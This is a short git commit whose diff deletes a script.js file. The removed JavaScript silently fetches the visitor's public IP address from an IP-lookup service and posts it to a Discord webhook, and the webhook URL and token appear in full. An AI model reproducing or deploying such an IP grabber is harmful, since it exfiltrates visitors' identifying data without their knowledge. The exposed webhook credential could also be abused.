3ad607d65f5a2dddcf87095ebfaad22d05c9a8dd
noxio90 <102378118+noxio90@users.noreply.github.com>
2025-06-01 16:18:17 +0200

    hh

--- script.js
+++
@@ -1,6 +0,0 @@
-async function fe() {
-    const aipee = await fetch("https://api.ipify.org/?format=json")
-    await fetch("https://discord.com/api/webhooks/1358454244826550430/U4Yw5JggL4eCoshY8I1ListLBDBaCjRD-3sJndIGW8tI7calGTd4j4RS-W5S9ABYkiiH", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({"content": await aipee.text()})})
-}
-
-fe()
